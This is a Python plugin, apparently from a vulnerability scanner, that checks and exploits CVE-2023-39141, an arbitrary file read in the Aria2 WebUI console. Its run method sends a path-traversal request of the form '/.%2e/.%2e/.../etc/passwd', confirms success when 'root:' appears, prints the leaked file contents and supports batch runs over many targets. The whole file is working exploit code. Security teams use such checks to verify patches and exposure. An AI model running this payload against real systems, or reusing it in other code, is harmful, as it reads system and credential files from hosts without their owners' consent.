import warnings,requests
from libs.outprint import OutPrintInfo,OutPrintInfoSuc
from libs.reqset import ReqSet
from libs.output import OutPutFile
warnings.filterwarnings("ignore")
class Cve_2023_39141:
    def run(self,url):
        base_url = url + "/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd"
        try:
            response = requests.get(base_url,headers=self.headers,verify=self.ssl,proxies=self.proxy)
            if "root:" in response.text:
                OutPrintInfoSuc("Aria", f"目标存在漏洞！{base_url}")
                if not self.batch:
                    OutPrintInfo("Aria", f"执行结果:")
                    OutPrintInfo("Aria", f"响应:\n{response.text.strip()}")
                else:
                    OutPutFile("aria_2023_39141txt",f"目标存在漏洞！{base_url}")

                return True
            else:
                return False

        except Exception as e:
            if not self.batch:
                OutPrintInfo("Aria", "目标请求出错")
                return False
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        headers = target["header"]
        proxy = target["proxy"]
        if not self.batch:
            req = ReqSet(header=headers, proxy=proxy)
            self.proxy = req["proxy"]
            self.headers = req["header"]
        else:
            self.proxy = {"http": proxy, "https": proxy}
            req = ReqSet(header=headers)
            self.headers = req["header"]
        if not self.batch:
            OutPrintInfo("Aria", f"开始检测Aria2 WebUI控制台 任意文件读取漏洞...")
        self.run(url)
        if not self.batch:
            OutPrintInfo("Aria", f"Aria2 WebUI控制台 任意文件读取漏洞检测结束")